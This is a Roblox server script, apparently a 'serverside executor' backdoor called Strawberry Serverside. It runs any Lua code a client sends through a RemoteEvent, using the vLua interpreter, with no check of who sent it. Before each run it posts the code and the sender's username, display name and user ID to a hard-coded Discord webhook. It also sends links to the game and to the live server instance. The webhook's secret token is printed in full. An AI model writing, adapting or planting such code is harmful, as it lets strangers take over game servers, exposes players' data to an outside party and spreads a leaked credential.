local http = game:GetService("HttpService")
local vlua = require(script:FindFirstChild("vLua"))
local remote = script.Parent
local webhook = "https://discord.com/api/webhooks/1482287481046175917/NYkva-bnem7kS7JfJCIx31z5zMHP5ufFLwxusEP4IxrjhFvgJqiNESKSTcyduPV76A1T"

local function log(plr,code)
	local embed = { 
		embeds = {{
			title = "Execution Logged",
			color = 16407390,
			footer = {
				text = "Strawberry Serverside  •  "..os.date("%I:%M %p")
			},
			fields = {
				{ name = "Username", value = plr.Name, inline = true},
				{ name = "Display Name", value = plr.DisplayName, inline = true},
				{ name = "User ID", value = plr.UserId, inline = true},
				{ name = "Script Content", value = "```lua\n"..code.."\n```", inline = false},
				{ name = "Game Link", value = "[Click here!](https://roblox.com/games/"..game.PlaceId..")", inline = true},
				{ name = "Server Link", value = "[Click here!](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&serverInstanceId="..game.JobId..")", inline = true},
				{ name = "Script Blacklisted", value = "**Coming soon...**", inline = true},
			}
		}}
	}
	http:PostAsync(webhook,http:JSONEncode(embed),Enum.HttpContentType.ApplicationJson)
end

remote.OnServerEvent:Connect(function(plr,code)
	task.spawn(function()
		log(plr,code)
		task.wait(0.5)
		vlua(code)()
	end)
end)
